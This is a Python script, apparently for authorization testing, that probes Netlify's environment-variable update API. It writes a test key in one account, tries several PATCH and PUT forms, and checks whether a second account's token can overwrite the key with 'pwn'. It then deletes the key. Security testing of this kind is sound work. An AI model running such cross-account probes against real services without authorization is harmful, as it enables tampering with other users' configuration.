# -*- coding: utf-8 -*-
"""env 更新接口(PATCH context 参数形态) + 跨账号确认 + 收尾"""
import http.client, ssl, gzip, brotli, json, sys, random
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import TOKEN_A, TOKEN_B

SITE_B = 'd2977de0-d24d-4544-81cb-933e610cad7d'
ACC_B = '6a97b6454fef0db964f75db6'
ctx = ssl.create_default_context()

def req(method, path, body=None, token=None, timeout=20):
    conn = http.client.HTTPSConnection('api.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json'}
    if token: h['Authorization'] = 'Bearer ' + token
    b = json.dumps(body).encode() if body is not None else None
    conn.request(method, path, body=b, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br': raw = brotli.decompress(raw)
    elif enc == 'gzip': raw = gzip.decompress(raw)
    st = r.status
    txt = raw.decode('utf-8', 'ignore')
    conn.close()
    return st, txt

R = random.randint(1000, 9999)
K = 'T_U%s' % R
# 先写一个
st, b = req('POST', '/api/v1/accounts/%s/env?site_id=%s' % (ACC_B, SITE_B),
            [{'key': K, 'values': [{'context': 'production', 'value': 'v1'}]}], TOKEN_B)
print('POST 基线:', st, b[:80])

print()
print('== 更新形态探索 ==')
upd = [
    ('PATCH +query context', 'PATCH', '/api/v1/accounts/%s/env/%s?site_id=%s&context=production' % (ACC_B, K, SITE_B),
     [{'context': 'production', 'value': 'v2'}]),
    ('PATCH +query context 单对象', 'PATCH',
     '/api/v1/accounts/%s/env/%s?site_id=%s&context=production' % (ACC_B, K, SITE_B),
     {'context': 'production', 'value': 'v2'}),
    ('PUT 单对象', 'PUT', '/api/v1/accounts/%s/env/%s?site_id=%s' % (ACC_B, K, SITE_B),
     {'key': K, 'values': [{'context': 'production', 'value': 'v3'}]}),
    ('PATCH 无 body query', 'PATCH', '/api/v1/accounts/%s/env/%s?site_id=%s&context=production&value=v4' % (ACC_B, K, SITE_B),
     None),
]
for tag, m, p, bd in upd:
    st, b = req(m, p, bd, TOKEN_B)
    print('%-28s %s | %s' % (tag, st, b[:130]))

st, b = req('GET', '/api/v1/sites/%s/env' % SITE_B, token=TOKEN_B)
print('GET after upd:', st, b[:200])

print()
print('== 跨账号更新(A token 对 B 的 key)==')
st, b = req('PATCH', '/api/v1/accounts/%s/env/%s?site_id=%s&context=production' % (ACC_B, K, SITE_B),
            [{'context': 'production', 'value': 'pwn'}], TOKEN_A)
print('A PATCH B key ->', st, b[:120])
st, b = req('PUT', '/api/v1/accounts/%s/env/%s?site_id=%s' % (ACC_B, K, SITE_B),
            {'key': K, 'values': [{'context': 'production', 'value': 'pwn'}]}, TOKEN_A)
print('A PUT B key    ->', st, b[:120])

print()
print('== 清理 ==')
st, b = req('DELETE', '/api/v1/accounts/%s/env/%s?site_id=%s' % (ACC_B, K, SITE_B), token=TOKEN_B)
print('del:', st)
st, b = req('GET', '/api/v1/sites/%s/env' % SITE_B, token=TOKEN_B)
print('final:', st, b[:80])
print('done')
